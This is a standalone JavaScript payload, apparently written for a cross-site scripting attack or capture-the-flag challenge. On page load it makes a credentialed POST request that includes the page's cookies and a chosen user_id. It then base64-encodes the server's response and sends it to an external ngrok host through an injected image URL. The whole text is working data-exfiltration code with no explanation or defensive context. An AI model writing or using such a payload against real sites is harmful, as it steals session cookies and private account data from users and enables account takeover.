window.addEventListener('load', function () {

  function send2server(name, data){
    img = document.createElement("img");
    img.src = "https://3c70bb4e.ngrok.io/?name="+name+"&data="+btoa(encodeURI(data));
    document.getElementById("chat-div").appendChild(img);
}

fetch(window.location.pathname, {
     method: 'POST',
     headers: {
      'Content-Type': 'application/x-www-form-urlencoded',
    },
      credentials: 'include',
     body: 'name=test&user_id=2&' +document.cookie
}).then(function(response){
	response.text().then(function(back){
	 send2server("resp", back);	
	})
})
      
  })
